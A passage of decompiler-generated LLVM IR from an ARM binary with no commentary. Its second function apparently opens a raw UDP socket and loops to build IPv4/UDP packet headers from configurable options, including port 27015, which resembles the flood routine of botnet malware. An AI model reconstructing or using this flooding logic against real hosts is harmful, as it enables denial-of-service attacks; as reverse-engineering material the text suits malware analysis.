  %v2_ce68 = add i32 %v1_ce68, %v5_ce64
  store i32 %v2_ce68, i32* %r3.global-to-local, align 4
  store i32 %v2_cb98, i32* %r1.global-to-local, align 4
  %v1_ce70 = add i32 %v2_ce68, 20
  %v2_ce70 = inttoptr i32 %v1_ce70 to i8*
  %v3_ce70 = load i8, i8* %v2_ce70, align 1
  %v4_ce74 = mul i32 %v1_ce74, 4
  %v5_ce74 = add i32 %v4_ce74, %v2_cb98
  %v6_ce74 = inttoptr i32 %v5_ce74 to i32*
  %v7_ce74 = load i32, i32* %v6_ce74, align 4
  store i32 %v7_ce74, i32* @r5, align 4
  %v7_ce78 = icmp eq i8 %v3_ce70, 31
  store i1 %v7_ce78, i1* %cpsr_z.global-to-local, align 1
  %v1_ce7c = add i32 %v7_ce74, 20
  store i32 %v1_ce7c, i32* @r6, align 4
  %tmp43 = icmp ult i8 %v3_ce70, 32
  br i1 %tmp43, label %dec_label_pc_cf80, label %dec_label_pc_ce84

dec_label_pc_ce84:                                ; preds = %dec_label_pc_ce60
  store i1 %v8_cfb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_cfb0, label %dec_label_pc_cfbc, label %dec_label_pc_ce90

dec_label_pc_ce90:                                ; preds = %dec_label_pc_cf80, %dec_label_pc_ce84
  store i32 %v3_cd2c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_cfcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_cfcc, label %dec_label_pc_cfd8, label %dec_label_pc_cea4

dec_label_pc_cea4:                                ; preds = %dec_label_pc_cfbc.dec_label_pc_cea4_crit_edge, %dec_label_pc_ce90
  %v1_cea8 = phi i32 [ %v1_cea8.pre, %dec_label_pc_cfbc.dec_label_pc_cea4_crit_edge ], [ 65535, %dec_label_pc_ce90 ]
  store i32 %v3_cd10, i32* %r1.global-to-local, align 4
  %v9_cea8 = icmp eq i32 %v3_cd10, %v1_cea8
  store i1 %v9_cea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cea8, label %dec_label_pc_cfec, label %dec_label_pc_ceb0

dec_label_pc_ceb0:                                ; preds = %dec_label_pc_cfd8.dec_label_pc_ceb0_crit_edge, %dec_label_pc_cea4
  %v1_ceb4 = phi i32 [ %v1_ceb4.pre, %dec_label_pc_cfd8.dec_label_pc_ceb0_crit_edge ], [ %v1_cea8, %dec_label_pc_cea4 ]
  %v9_ceb4 = icmp eq i32 %v3_cd30, %v1_ceb4
  store i1 %v9_ceb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ceb4, label %dec_label_pc_d000, label %dec_label_pc_cebc

dec_label_pc_cebc:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_ceb0, %dec_label_pc_d000
  store i32 %v1_cc8c, i32* %r3.global-to-local, align 4
  store i1 %v2_cec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cec0, label %dec_label_pc_cec8, label %dec_label_pc_cf70

dec_label_pc_cec8:                                ; preds = %dec_label_pc_cebc, %dec_label_pc_cf70
  %v2_cecc = load i32, i32* @r5, align 4
  %v3_cecc = add i32 %v2_cecc, 10
  %v4_cecc = inttoptr i32 %v3_cecc to i16*
  store i16 0, i16* %v4_cecc, align 2
  %v0_ced0 = load i32, i32* @r5, align 4
  store i32 %v0_ced0, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_ced8 = call i32 @function_dadc(i32 %v0_ced0, i32 20)
  %v3_ced8 = trunc i32 %v2_ced8 to i16
  %v3_cedc = load i32, i32* @r5, align 4
  %v4_cedc = add i32 %v3_cedc, 10
  %v5_cedc = inttoptr i32 %v4_cedc to i16*
  store i16 %v3_ced8, i16* %v5_cedc, align 2
  %v2_cee4 = load i32, i32* @r6, align 4
  %v3_cee4 = add i32 %v2_cee4, 6
  %v4_cee4 = inttoptr i32 %v3_cee4 to i16*
  store i16 0, i16* %v4_cee4, align 2
  %v0_cee8 = load i32, i32* @r6, align 4
  store i32 %v0_cee8, i32* @r1, align 4
  %v1_ceec = add i32 %v0_cee8, 4
  %v2_ceec = inttoptr i32 %v1_ceec to i16*
  %v3_ceec = load i16, i16* %v2_ceec, align 2
  %v4_ceec = zext i16 %v3_ceec to i32
  %v0_cef0 = load i32, i32* @sl, align 4
  store i32 %v0_cef0, i32* %r3.global-to-local, align 4
  %v0_cef4 = load i32, i32* @r5, align 4
  %v4_cef8 = call i32 @function_db2c(i32 %v0_cef4, i32 %v0_cee8, i32 %v4_ceec, i32 %v0_cef0)
  %v5_cef8 = trunc i32 %v4_cef8 to i16
  %v3_cefc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cefc, i32* %r3.global-to-local, align 4
  %v3_cf00 = mul i32 %v3_cefc, 32
  store i32 %v3_cf00, i32* %lr.global-to-local, align 4
  %v3_cf04 = load i32, i32* @r6, align 4
  %v4_cf04 = add i32 %v3_cf04, 6
  %v5_cf04 = inttoptr i32 %v4_cf04 to i16*
  store i16 %v5_cef8, i16* %v5_cf04, align 2
  %v0_cf08 = load i32, i32* %lr.global-to-local, align 4
  %v1_cf08 = load i32, i32* %r3.global-to-local, align 4
  %tmp44 = mul i32 %v1_cf08, -8
  %v5_cf08 = add i32 %v0_cf08, %tmp44
  store i32 %v5_cf08, i32* %lr.global-to-local, align 4
  %v0_cf0c = load i32, i32* @r6, align 4
  %v1_cf0c = add i32 %v0_cf0c, 2
  %v2_cf0c = inttoptr i32 %v1_cf0c to i16*
  %v3_cf0c = load i16, i16* %v2_cf0c, align 2
  %v1_cf10 = load i32, i32* @r8, align 4
  %v2_cf10 = add i32 %v1_cf10, %v5_cf08
  store i32 %v2_cf10, i32* @lr, align 4
  %v3_cf14 = add i32 %v2_cf10, 2
  %v4_cf14 = inttoptr i32 %v3_cf14 to i16*
  store i16 %v3_cf0c, i16* %v4_cf14, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_cf20 = load i32, i32* @r5, align 4
  store i32 %v0_cf20, i32* @r1, align 4
  %v0_cf24 = load i32, i32* @fp, align 4
  store i32 %v0_cf24, i32* @r0, align 4
  %v0_cf28 = load i32, i32* @sb, align 4
  store i32 %v0_cf28, i32* @r2, align 4
  %v0_cf34 = call i32 @function_14a98()
  %v3_cf38 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cf38, i32* %r3.global-to-local, align 4
  %v1_cf3c = add i32 %v3_cf38, 1
  %v1_cf40 = load i32, i32* @r7, align 4
  %v9_cf40 = icmp eq i32 %v1_cf3c, %v1_cf40
  store i1 %v9_cf40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cf3c, i32* %stack_var_-44, align 4
  %v5_cf48 = icmp slt i32 %v1_cf3c, %v1_cf40
  br i1 %v5_cf48, label %dec_label_pc_ce60, label %dec_label_pc_cf4c

dec_label_pc_cf4c:                                ; preds = %dec_label_pc_cf5c, %dec_label_pc_cec8, %dec_label_pc_cf4c.preheader
  %v0_cf60 = phi i32 [ %v0_cf50.pre, %dec_label_pc_cf4c.preheader ], [ 0, %dec_label_pc_cf5c ], [ %v1_cf40, %dec_label_pc_cec8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_cf50 = icmp eq i32 %v0_cf60, 0
  store i1 %v2_cf50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_cf50, label %dec_label_pc_cf5c, label %dec_label_pc_ce5c

dec_label_pc_cf5c:                                ; preds = %dec_label_pc_cf4c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_cf4c

dec_label_pc_cf70:                                ; preds = %dec_label_pc_cebc
  %v0_cf70 = load i32, i32* @r5, align 4
  %v1_cf70 = add i32 %v0_cf70, 28
  store i32 %v0_cd04, i32* %r1.global-to-local, align 4
  %v2_cf78 = inttoptr i32 %v1_cf70 to i16*
  %v3_cf78 = call i32 @function_f770(i16* %v2_cf78, i32 %v0_cd04)
  br label %dec_label_pc_cec8

dec_label_pc_cf80:                                ; preds = %dec_label_pc_ce60
  %v1_cf80 = add i32 %v2_ce68, 16
  %v2_cf80 = inttoptr i32 %v1_cf80 to i32*
  %v3_cf80 = load i32, i32* %v2_cf80, align 4
  %v1_cf84 = call i32 @function_149d0(i32 %v3_cf80)
  store i32 %v1_cf84, i32* %r4.global-to-local, align 4
  %v0_cf8c = call i32 @function_f570()
  %v3_cf90 = load i32, i32* %stack_var_-44, align 4
  %v5_cf98 = mul i32 %v3_cf90, 24
  %v1_cf9c = load i32, i32* @r8, align 4
  %v2_cf9c = add i32 %v1_cf9c, %v5_cf98
  store i32 %v2_cf9c, i32* %r3.global-to-local, align 4
  %v1_cfa0 = add i32 %v2_cf9c, 20
  %v2_cfa0 = inttoptr i32 %v1_cfa0 to i8*
  %v3_cfa0 = load i8, i8* %v2_cfa0, align 1
  %v4_cfa0 = zext i8 %v3_cfa0 to i32
  %v0_cfa4 = load i32, i32* %r4.global-to-local, align 4
  %v7_cfa4 = lshr i32 %v0_cf8c, %v4_cfa0
  %v8_cfa4 = add i32 %v7_cfa4, %v0_cfa4
  %v1_cfa8 = call i32 @function_14828(i32 %v8_cfa4)
  store i1 %v8_cfb0, i1* %cpsr_z.global-to-local, align 1
  %v1_cfb4 = load i32, i32* @r5, align 4
  %v2_cfb4 = add i32 %v1_cfb4, 16
  %v3_cfb4 = inttoptr i32 %v2_cfb4 to i32*
  store i32 %v1_cfa8, i32* %v3_cfb4, align 4
  br i1 %v3_cfb0, label %dec_label_pc_cfbc, label %dec_label_pc_ce90

dec_label_pc_cfbc:                                ; preds = %dec_label_pc_cf80, %dec_label_pc_ce84
  %v0_cfbc = call i32 @function_f570()
  store i32 %v3_cd2c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_cfcc, i1* %cpsr_z.global-to-local, align 1
  %v1_cfd0 = load i32, i32* @r5, align 4
  %v2_cfd0 = add i32 %v1_cfd0, 12
  %v3_cfd0 = inttoptr i32 %v2_cfd0 to i32*
  store i32 %v0_cfbc, i32* %v3_cfd0, align 4
  br i1 %v3_cfcc, label %dec_label_pc_cfd8, label %dec_label_pc_cfbc.dec_label_pc_cea4_crit_edge

dec_label_pc_cfbc.dec_label_pc_cea4_crit_edge:    ; preds = %dec_label_pc_cfbc
  %v1_cea8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cea4

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cfbc, %dec_label_pc_ce90
  %v0_cfd8 = call i32 @function_f570()
  %v1_cfd8 = trunc i32 %v0_cfd8 to i16
  store i32 %v3_cd10, i32* %r1.global-to-local, align 4
  %v1_cfe0 = load i32, i32* @r4, align 4
  %v9_cfe0 = icmp eq i32 %v3_cd10, %v1_cfe0
  store i1 %v9_cfe0, i1* %cpsr_z.global-to-local, align 1
  %v3_cfe4 = load i32, i32* @r5, align 4
  %v4_cfe4 = add i32 %v3_cfe4, 4
  %v5_cfe4 = inttoptr i32 %v4_cfe4 to i16*
  store i16 %v1_cfd8, i16* %v5_cfe4, align 2
  br i1 %v9_cfe0, label %dec_label_pc_cfec, label %dec_label_pc_cfd8.dec_label_pc_ceb0_crit_edge

dec_label_pc_cfd8.dec_label_pc_ceb0_crit_edge:    ; preds = %dec_label_pc_cfd8
  %v1_ceb4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ceb0

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfd8, %dec_label_pc_cea4
  %v0_cfec = call i32 @function_f570()
  %v1_cfec = trunc i32 %v0_cfec to i16
  %v1_cff4 = load i32, i32* @r4, align 4
  %v9_cff4 = icmp eq i32 %v3_cd30, %v1_cff4
  store i1 %v9_cff4, i1* %cpsr_z.global-to-local, align 1
  %v3_cff8 = load i32, i32* @r5, align 4
  %v4_cff8 = add i32 %v3_cff8, 20
  %v5_cff8 = inttoptr i32 %v4_cff8 to i16*
  store i16 %v1_cfec, i16* %v5_cff8, align 2
  br i1 %v9_cff4, label %dec_label_pc_d000, label %dec_label_pc_cebc

dec_label_pc_d000:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_ceb0
  %v0_d000 = call i32 @function_f570()
  %v1_d000 = trunc i32 %v0_d000 to i16
  %v3_d004 = load i32, i32* @r6, align 4
  %v4_d004 = add i32 %v3_d004, 2
  %v5_d004 = inttoptr i32 %v4_d004 to i16*
  store i16 %v1_d000, i16* %v5_d004, align 2
  br label %dec_label_pc_cebc

dec_label_pc_d00c:                                ; preds = %dec_label_pc_ccc4
  %v0_d00c = load i32, i32* @fp, align 4
  store i32 %v0_d00c, i32* @r0, align 4
  %v1_d010 = call i32 @function_15b20(i32 %v0_d00c)
  br label %dec_label_pc_d014

dec_label_pc_d014:                                ; preds = %dec_label_pc_cb7c, %dec_label_pc_d00c
  %v1_d01c = phi i32 [ %v3_ccb4, %dec_label_pc_cb7c ], [ %v1_d010, %dec_label_pc_d00c ]
  store i32 %v3_cb7c, i32* %r4.global-to-local, align 4
  store i32 %v18_cb7c, i32* %sb.global-to-local, align 4
  store i32 %v27_cb7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_d01c

; uselistorder directives
  uselistorder i32 %v1_cf3c, { 2, 0, 3, 1 }
  uselistorder i32 %v5_cf08, { 1, 0 }
  uselistorder i32 %v0_ce44, { 1, 0 }
  uselistorder i1 %v3_cfcc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_cd30, { 2, 1, 0 }
  uselistorder i32 %v3_cd2c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_cd10, { 5, 4, 3, 2, 1, 6, 0 }
  uselistorder i32 %v0_cd04, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v3_ccf8, { 2, 0, 1 }
  uselistorder i1 %v7_cce4, { 1, 0 }
  uselistorder i1 %v7_ccb8, { 1, 0 }
  uselistorder i32 %v3_ccb4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_cca0, { 0, 2, 1 }
  uselistorder i32 %v2_cb98, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 13, 3, 7, 8, 9, 10, 11, 12, 14, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 17, 18, 19, 20, 13, 14, 15, 16, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 18, 17, 19, 20, 22, 21, 24, 23, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 14, 15, 13, 16, 17, 18, 19 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d014, { 1, 0 }
  uselistorder label %dec_label_pc_cec8, { 1, 0 }
  uselistorder label %dec_label_pc_cebc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cf4c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cd74, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
}

define i32 @function_d024(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d024:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_d024 = load i32, i32* @r4, align 4
  %v27_d024 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_d040 = call i32 @function_1320c(i32 %arg1, i32 4)
  %v0_d044 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d040, i32* @fp, align 4
  %v0_d054 = load i32, i32* @r4, align 4
  %v4_d058 = inttoptr i32 %v0_d044 to i32*
  %v5_d058 = call i32 @function_a430(i32 %v0_d054, i32* %v4_d058, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d070 = load i32, i32* @r4, align 4
  %v0_d074 = load i32, i32* @r5, align 4
  %v5_d078 = trunc i32 %v5_d058 to i8
  %v6_d07c = inttoptr i32 %v0_d074 to i32*
  %v7_d07c = call i32 @function_a430(i32 %v0_d070, i32* %v6_d07c, i32 3, i32 65535)
  %v0_d080 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_d08c = load i32, i32* @r4, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_d094 = inttoptr i32 %v0_d080 to i32*
  %v6_d094 = call i32 @function_a430(i32 %v0_d08c, i32* %v5_d094, i32 4, i32 64)
  %v0_d0a0 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d0ac = load i32, i32* @r4, align 4
  %v6_d0b4 = inttoptr i32 %v0_d0a0 to i32*
  %v7_d0b4 = call i32 @function_a430(i32 %v0_d0ac, i32* %v6_d0b4, i32 5, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d0c8 = load i32, i32* @r4, align 4
  %v0_d0cc = load i32, i32* @r5, align 4
  %v1_d0d0 = urem i32 %v7_d0b4, 256
  store i32 %v1_d0d0, i32* @r7, align 4
  %v4_d0d4 = inttoptr i32 %v0_d0cc to i32*
  %v5_d0d4 = call i32 @function_a430(i32 %v0_d0c8, i32* %v4_d0d4, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d0e4 = load i32, i32* @r5, align 4
  %v0_d0ec = load i32, i32* @r4, align 4
  %v5_d0f0 = inttoptr i32 %v0_d0e4 to i32*
  %v6_d0f0 = call i32 @function_a430(i32 %v0_d0ec, i32* %v5_d0f0, i32 7, i32 27015)
  store i32 %v6_d0f0, i32* @r4, align 4
  %v1_d0fc = call i32 @function_11a94(i32 29)
  %v3_d108 = call i32 @function_119d0(i32 29, i32* nonnull %stack_var_-48)
  store i32 %v3_d108, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d11c = call i32 @function_14b54(i32 2, i32 3, i32 17)
  store i32 %v3_d11c, i32* @r0, align 4
  %v7_d120 = icmp eq i32 %v3_d11c, -1
  store i1 %v7_d120, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d11c, i32* @sb, align 4
  br i1 %v7_d120, label %dec_label_pc_d420, label %dec_label_pc_d12c

dec_label_pc_d12c:                                ; preds = %dec_label_pc_d024
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d134 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d134, i32* %r3.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_d148 = call i32 @function_14ae4(i32 %v3_d11c, i32 0, i32 3, i32 %v6_d134, i32 ptrtoint (i32* @0 to i32))
  %v7_d14c = icmp eq i32 %v5_d148, -1
  store i1 %v7_d14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d14c, label %dec_label_pc_d418, label %dec_label_pc_d154

dec_label_pc_d154:                                ; preds = %dec_label_pc_d12c
  %v0_d164 = load i32, i32* @r4, align 4
  %v3_d16c = urem i32 %v7_d07c, 65536
  store i32 %v3_d16c, i32* %r3.global-to-local, align 4
  %v3_d170 = urem i32 %v5_d0d4, 65536
  store i32 %v3_d170, i32* %r2.global-to-local, align 4
  %v3_d174 = urem i32 %v0_d164, 65536
  %v0_d178 = load i32, i32* @r8, align 4
  %v2_d178 = icmp eq i32 %v0_d178, 0
  store i1 %v2_d178, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d178, label %dec_label_pc_d384.preheader, label %dec_label_pc_d190

dec_label_pc_d384.preheader:                      ; preds = %dec_label_pc_d198, %dec_label_pc_d154
  %v0_d398.ph = phi i32 [ 0, %dec_label_pc_d154 ], [ %v1_d214, %dec_label_pc_d198 ]
  %v3_d2d8 = icmp eq i32 %v3_d16c, 65535
  br label %dec_label_pc_d384

dec_label_pc_d190:                                ; preds = %dec_label_pc_d154
  store i32 0, i32* @r4, align 4
  %v4_d258 = sext i8 %v5_d078 to i32
  %sext = mul i32 %v6_d094, 16777216
  %v4_d280 = sdiv i32 %sext, 16777216
  br label %dec_label_pc_d220

dec_label_pc_d198:                                ; preds = %dec_label_pc_d220, %dec_label_pc_d298
  %v2_d19c = phi i32 [ %v0_d290, %dec_label_pc_d220 ], [ %v2_d19c.pre, %dec_label_pc_d298 ]
  %v3_d19c = add i32 %v2_d19c, 9
  %v4_d19c = inttoptr i32 %v3_d19c to i8*
  store i8 17, i8* %v4_d19c, align 1
  %v3_d1a4 = load i32, i32* %stack_var_-44, align 4
  %v2_d1a8 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_d1a8, i32* %r2.global-to-local, align 4
  %v5_d1b0 = mul i32 %v3_d1a4, 24
  store i32 %v5_d1b0, i32* %r3.global-to-local, align 4
  %v1_d1b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1b4 = add i32 %v1_d1b4, 12
  %v3_d1b4 = inttoptr i32 %v2_d1b4 to i32*
  store i32 %v2_d1a8, i32* %v3_d1b4, align 4
  %v0_d1b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d1b8 = load i32, i32* @sl, align 4
  %v2_d1b8 = add i32 %v1_d1b8, %v0_d1b8
  store i32 %v2_d1b8, i32* %r3.global-to-local, align 4
  %v1_d1bc = add i32 %v2_d1b8, 16
  %v2_d1bc = inttoptr i32 %v1_d1bc to i32*
  %v3_d1bc = load i32, i32* %v2_d1bc, align 4
  store i32 %v3_d1bc, i32* %r2.global-to-local, align 4
  %v1_d1c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1c4 = add i32 %v1_d1c4, 16
  %v3_d1c4 = inttoptr i32 %v2_d1c4 to i32*
  store i32 %v3_d1bc, i32* %v3_d1c4, align 4
  %v1_d1c8 = call i32 @function_1484c(i32 %v3_d170)
  %v2_d1c8 = trunc i32 %v1_d1c8 to i16
  %v3_d1cc = load i32, i32* %r4.global-to-local, align 4
  %v4_d1cc = add i32 %v3_d1cc, 20
  %v5_d1cc = inttoptr i32 %v4_d1cc to i16*
  store i16 %v2_d1c8, i16* %v5_d1cc, align 2
  %v1_d1d4 = call i32 @function_1484c(i32 %v3_d174)
  %v2_d1d4 = trunc i32 %v1_d1d4 to i16
  %v3_d1d8 = load i32, i32* %stack_var_-48, align 4
  %v1_d1dc = mul i32 %v3_d1d8, 65536
  %v3_d1e0 = add i32 %v1_d1dc, 786432
  store i32 %v3_d1e0, i32* %r3.global-to-local, align 4
  %v3_d1e4 = load i32, i32* @r5, align 4
  %v4_d1e4 = add i32 %v3_d1e4, 2
  %v5_d1e4 = inttoptr i32 %v4_d1e4 to i16*
  store i16 %v2_d1d4, i16* %v5_d1e4, align 2
  %v0_d1e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1e8 = udiv i32 %v0_d1e8, 65536
  %v1_d1ec = call i32 @function_1484c(i32 %v3_d1e8)
  %v2_d1ec = trunc i32 %v1_d1ec to i16
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d1f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1f4 = add i32 %v1_d1f4, 28
  %v3_d1f4 = inttoptr i32 %v2_d1f4 to i32*
  store i32 -1, i32* %v3_d1f4, align 4
  %v3_d1f8 = load i32, i32* @r5, align 4
  %v4_d1f8 = add i32 %v3_d1f8, 4
  %v5_d1f8 = inttoptr i32 %v4_d1f8 to i16*
  store i16 %v2_d1ec, i16* %v5_d1f8, align 2
  %v0_d1fc = load i32, i32* @r6, align 4
  %v0_d200 = load i32, i32* %r4.global-to-local, align 4
  %v1_d200 = add i32 %v0_d200, 32
  %v3_d204 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d204, i32* %r2.global-to-local, align 4
  %v3_d208 = call i32 @function_12394(i32 %v1_d200, i32 %v0_d1fc, i32 %v3_d204)
  %v3_d20c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d20c, i32* %r3.global-to-local, align 4
  %v1_d210 = add i32 %v3_d20c, 1
  store i32 %v1_d210, i32* @r4, align 4
  %v1_d214 = load i32, i32* @r8, align 4
  %v9_d214 = icmp eq i32 %v1_d210, %v1_d214
  store i1 %v9_d214, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d210, i32* %stack_var_-44, align 4
  %v6_d21c = icmp slt i32 %v1_d210, %v1_d214
  br i1 %v6_d21c, label %dec_label_pc_d220, label %dec_label_pc_d384.preheader

dec_label_pc_d220:                                ; preds = %dec_label_pc_d198, %dec_label_pc_d190
  %v2_d228 = call i32 @function_1320c(i32 128, i32 1)
  %v3_d22c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d22c, i32* %r2.global-to-local, align 4
  %v1_d230 = load i32, i32* @fp, align 4
  %v2_d230 = load i32, i32* @r4, align 4
  %v5_d230 = mul i32 %v2_d230, 4
  %v6_d230 = add i32 %v5_d230, %v1_d230
  %v7_d230 = inttoptr i32 %v6_d230 to i32*
  store i32 %v2_d228, i32* %v7_d230, align 4
  %v0_d234 = load i32, i32* @fp, align 4
  %v1_d234 = load i32, i32* %r2.global-to-local, align 4
  %v4_d234 = mul i32 %v1_d234, 4
  %v5_d234 = add i32 %v4_d234, %v0_d234
  %v6_d234 = inttoptr i32 %v5_d234 to i32*
  %v7_d234 = load i32, i32* %v6_d234, align 4
  store i32 %v7_d234, i32* %r4.global-to-local, align 4
  %v1_d238 = inttoptr i32 %v7_d234 to i8*
  %v2_d238 = load i8, i8* %v1_d238, align 1
  %tmp = urem i8 %v2_d238, 16
  %v1_d23c = zext i8 %tmp to i32
  %v1_d240 = or i32 %v1_d23c, 64
  store i32 %v1_d240, i32* %r3.global-to-local, align 4
  %v1_d244 = trunc i32 %v1_d240 to i8
  store i8 %v1_d244, i8* %v1_d238, align 1
  %v0_d248 = load i32, i32* %r4.global-to-local, align 4
  %v1_d248 = inttoptr i32 %v0_d248 to i8*
  %v2_d248 = load i8, i8* %v1_d248, align 1
  %v1_d24c = and i8 %v2_d248, -16
  %v1_d250 = or i8 %v1_d24c, 5
  store i8 %v1_d250, i8* %v1_d248, align 1
  store i32 %v4_d258, i32* %r2.global-to-local, align 4
  %v2_d25c = load i32, i32* %r4.global-to-local, align 4
  %v3_d25c = add i32 %v2_d25c, 1
  %v4_d25c = inttoptr i32 %v3_d25c to i8*
  store i8 %v5_d078, i8* %v4_d25c, align 1
  %v3_d260 = load i32, i32* %stack_var_-48, align 4
  %v1_d264 = add i32 %v3_d260, 32
  %v3_d26c = urem i32 %v1_d264, 65536
  %v1_d270 = call i32 @function_1484c(i32 %v3_d26c)
  %v2_d270 = trunc i32 %v1_d270 to i16
  %v3_d274 = load i32, i32* %r4.global-to-local, align 4
  %v4_d274 = add i32 %v3_d274, 2
  %v5_d274 = inttoptr i32 %v4_d274 to i16*
  store i16 %v2_d270, i16* %v5_d274, align 2
  %v1_d27c = call i32 @function_1484c(i32 %v3_d16c)
  %v2_d27c = trunc i32 %v1_d27c to i16
  store i32 %v4_d280, i32* %r3.global-to-local, align 4
  %v0_d284 = load i32, i32* @r7, align 4
  %v2_d284 = icmp eq i32 %v0_d284, 0
  store i1 %v2_d284, i1* %cpsr_z.global-to-local, align 1
  %v3_d288 = load i32, i32* %r4.global-to-local, align 4
  %v4_d288 = add i32 %v3_d288, 4
  %v5_d288 = inttoptr i32 %v4_d288 to i16*
  store i16 %v2_d27c, i16* %v5_d288, align 2
  %v0_d28c = load i32, i32* %r3.global-to-local, align 4
  %v1_d28c = trunc i32 %v0_d28c to i8
  %v2_d28c = load i32, i32* %r4.global-to-local, align 4
  %v3_d28c = add i32 %v2_d28c, 8
  %v4_d28c = inttoptr i32 %v3_d28c to i8*
  store i8 %v1_d28c, i8* %v4_d28c, align 1
  %v0_d290 = load i32, i32* %r4.global-to-local, align 4
  %v1_d290 = add i32 %v0_d290, 20
  store i32 %v1_d290, i32* @r5, align 4
  %v0_d294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d294, label %dec_label_pc_d198, label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d220
  %v1_d29c = call i32 @function_1484c(i32 16384)
  %v2_d29c = trunc i32 %v1_d29c to i16
  %v3_d2a0 = load i32, i32* %r4.global-to-local, align 4
  %v4_d2a0 = add i32 %v3_d2a0, 6
  %v5_d2a0 = inttoptr i32 %v4_d2a0 to i16*
  store i16 %v2_d29c, i16* %v5_d2a0, align 2
  %v2_d19c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d198

dec_label_pc_d2a8:                                ; preds = %dec_label_pc_d384
  br label %dec_label_pc_d2ac

